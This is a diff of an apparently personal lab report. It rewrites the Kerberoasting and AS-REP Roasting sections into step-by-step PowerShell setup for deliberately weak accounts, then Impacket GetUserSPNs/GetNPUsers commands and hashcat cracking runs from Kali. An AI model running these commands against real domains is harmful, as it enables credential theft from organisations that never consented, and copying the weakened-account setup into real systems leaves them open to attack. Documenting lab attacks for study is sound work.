@@ -10,26 +10,81 @@ LAB Active Directory domain, hosted on the Windows Server 2019 Domain Controller
 
 ## Attack Technique
 
-Two distinct Kerberos-based attack techniques were implemented against the domain:
+Two distinct Kerberos-based attack techniques were implemented against the domain: Kerberoasting and AS-REP Roasting.
 
-1. **Kerberoasting** (MITRE ATT&CK T1558.003) — A domain service account (`SQLService`) was registered with a Service Principal Name (SPN) and configured with a weak, crackable password. Using only a standard, already-authenticated domain user account, a Kerberos service ticket (TGS) tied to `SQLService` was requested from the Domain Controller. This is normal, permitted Kerberos behavior for any authenticated user and did not require any special access. The ticket was taken offline and cracked, recovering the service account's plaintext password.
+---
 
-2. **AS-REP Roasting** (MITRE ATT&CK T1558.004) — A separate domain user account (`j.smith`) was configured with the "Do not require Kerberos pre-authentication" setting enabled. This allowed a Kerberos AS-REP response for that account to be requested directly from the Domain Controller **with no credentials of any kind**. The response was taken offline and cracked, recovering the account's plaintext password.
+## Part A — Kerberoasting (MITRE ATT&CK T1558.003)
+
+### Setup — Vulnerable Service Account (Domain Controller)
+
+A service account was registered with a Service Principal Name (SPN) and configured with a weak, crackable password:
+
+```powershell
+setspn -L SQLService
+setspn -A MSSQLSvc/dbserver.lab.local:1433 SQLService
+
+Set-ADAccountPassword SQLService -Reset -NewPassword (ConvertTo-SecureString "[INSERT WEAK PASSWORD USED]" -AsPlainText -Force)
+```
+
+### Execution (Kali)
+
+Using only a standard, already-authenticated low-privilege domain user account, a Kerberos service ticket (TGS) tied to `SQLService` was requested — this is normal, permitted Kerberos behavior for any authenticated user:
+
+```bash
+GetUserSPNs.py LAB.local/pparker:password123 -dc-ip [INSERT DC IP] -request -outputfile spn_hashes.txt
+```
+
+The ticket was cracked offline:
+
+```bash
+hashcat -m 13100 spn_hashes.txt /usr/share/wordlists/rockyou.txt
+```
+
+### Result
+
+Plaintext password recovered for the `SQLService` account.
+
+---
+
+## Part B — AS-REP Roasting (MITRE ATT&CK T1558.004)
+
+### Setup — Vulnerable User Account (Domain Controller)
+
+A dedicated domain user account was created and configured with Kerberos pre-authentication disabled:
+
+```powershell
+New-ADUser -Name "j.smith" -SamAccountName "j.smith" -AccountPassword (ConvertTo-SecureString "[INSERT PASSWORD USED]" -AsPlainText -Force) -Enabled $true
+
+Set-ADAccountControl -Identity j.smith -DoesNotRequirePreAuth $true
+```
+
+(Equivalent GUI path: ADUC → j.smith → Properties → Account tab → "Do not require Kerberos preauthentication".)
+
+### Execution (Kali)
+
+An AS-REP response for the account was requested directly from the Domain Controller with **no credentials of any kind**:
+
+```bash
+GetNPUsers.py LAB.local/j.smith -no-pass -dc-ip [INSERT DC IP] -outputfile asrep_hashes.txt
+```
+
+The response was cracked offline:
+
+```bash
+hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
+```
+
+### Result
+
+Plaintext password recovered for the `j.smith` account, obtained without presenting any credentials.
+
+---
 
 ## Attack Path
 
 Both techniques exploit legitimate, by-design Kerberos protocol behavior combined with a specific account misconfiguration (a weak password on an SPN-registered account; a missing pre-authentication requirement on a user account) rather than a software vulnerability. Both were performed directly against the Domain Controller from the Kali attacker platform.
 
-## Result
-
-- Kerberoasting: plaintext password recovered for the `SQLService` account.
-- AS-REP Roasting: plaintext password recovered for the `j.smith` account, obtained without presenting any credentials.
-
-## Evidence
-
-[INSERT SCREENSHOT — cracked Kerberoasting hash]
-
-[INSERT SCREENSHOT — cracked AS-REP hash]
 
 ## Security Impact
 
